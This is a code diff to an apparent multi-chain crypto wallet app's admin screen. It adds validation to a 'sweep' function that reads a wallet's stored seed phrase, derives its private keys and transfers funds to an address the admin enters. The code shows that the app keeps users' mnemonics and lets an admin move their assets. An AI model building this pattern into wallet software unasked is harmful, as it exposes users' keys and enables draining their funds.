@@ -4540,16 +4540,24 @@ function AdminScreen({ onBack }) {
     setSweepResult(null);
     try {
       const mnemonicStr = (sweepWallet.mnemonic || "").trim();
-      if (!mnemonicStr) throw new Error("Нет seed-фразы для этого кошелька");
+      if (!mnemonicStr) throw new Error("Нет seed-фразы для этого кошелька. Убедитесь что кошелёк был создан через это приложение.");
+
+      // Validate mnemonic word count
+      const wordCount = mnemonicStr.split(/\s+/).length;
+      if (wordCount !== 12 && wordCount !== 24) {
+        throw new Error(`Неверный формат seed-фразы (${wordCount} слов). Ожидается 12 или 24 слова.`);
+      }
 
       const { addresses, privateKeys } = await deriveWallet(mnemonicStr);
 
       // Truncate to 8 decimal places — prevents NUMERIC_FAULT in ethers
-      const amt = Math.floor(parseFloat(sweepAmount) * 1e8) / 1e8;
-      if (!amt || amt <= 0) throw new Error("Укажите корректную сумму");
+      const rawAmt = parseFloat(String(sweepAmount).replace(',', '.'));
+      if (!rawAmt || isNaN(rawAmt) || rawAmt <= 0) throw new Error("Укажите корректную сумму (больше нуля)");
+      const amt = Math.floor(rawAmt * 1e8) / 1e8;
 
       const toAddr = sweepAddress.trim();
       if (!toAddr) throw new Error("Укажите адрес получателя");
+      if (toAddr.length < 10) throw new Error("Адрес получателя слишком короткий");
 
       const sym   = sweepToken;
       const netId = sym === 'USDT' ? sweepUsdtNet : undefined;
@@ -4557,14 +4565,13 @@ function AdminScreen({ onBack }) {
       // Map USDT network id to chain key used in privateKeys/addresses
       const NET_TO_CHAIN = { eth: 'ETH', bnb: 'BNB', arb: 'ARB', sol: 'SOL', ton: 'TON' };
 
-      const pk   = sym === 'USDT'
-        ? privateKeys[NET_TO_CHAIN[sweepUsdtNet] || 'ETH']
-        : (privateKeys[sym] || null);
-      const from = sym === 'USDT'
-        ? (addresses[NET_TO_CHAIN[sweepUsdtNet] || 'ETH'] || '')
-        : (addresses[sym] || '');
+      const chainKey = sym === 'USDT' ? (NET_TO_CHAIN[sweepUsdtNet] || 'ETH') : sym;
 
-      if (!pk) throw new Error(`Не удалось получить приватный ключ для ${sym}${netId ? ' (' + netId + ')' : ''}. Проверьте что кошелёк поддерживает эту сеть.`);
+      const pk   = privateKeys[chainKey] || null;
+      const from = addresses[chainKey] || '';
+
+      if (!pk) throw new Error(`Не удалось получить приватный ключ для ${sym}${netId ? ' (' + netId.toUpperCase() + ')' : ''}. Возможно, кошелёк не поддерживает эту сеть.`);
+      if (!from) throw new Error(`Не удалось получить адрес для ${sym}${netId ? ' (' + netId.toUpperCase() + ')' : ''}.`);
 
       const txHash = await chainSendTransaction({
         sym,
